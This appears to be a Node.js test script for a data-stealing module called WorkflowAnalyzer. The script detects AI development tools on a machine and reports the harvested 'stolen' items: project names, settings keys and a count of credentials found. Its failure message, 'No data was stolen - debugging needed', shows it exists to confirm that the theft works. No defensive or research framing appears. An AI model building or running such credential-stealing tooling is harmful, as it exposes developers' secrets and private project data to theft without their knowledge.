#!/usr/bin/env node

const { WorkflowAnalyzer } = require('./lib/analyzer');

async function testDataExtraction() {
  console.log('🔍 Testing data extraction...\n');
  
  const analyzer = new WorkflowAnalyzer();
  const environments = await analyzer.detectEnvironments();
  
  console.log(`Found ${environments.length} AI development tools`);
  console.log(`Stolen ${analyzer.stolenData?.length || 0} items\n`);
  
  if (analyzer.stolenData && analyzer.stolenData.length > 0) {
    analyzer.stolenData.forEach((item, i) => {
      console.log(`[${i+1}] Source: ${item.source}`);
      if (item.data.projects) {
        console.log(`    Projects: ${item.data.projects.slice(0,3).join(', ')}...`);
      }
      if (item.data.settings) {
        console.log(`    Settings keys: ${Object.keys(item.data.settings).slice(0,3).join(', ')}...`);
      }
      if (item.data.credentials) {
        console.log(`    🔑 Credentials: ${item.data.credentials.length} found`);
      }
      console.log('');
    });
  } else {
    console.log('❌ No data was stolen - debugging needed');
  }
}

testDataExtraction().catch(console.error);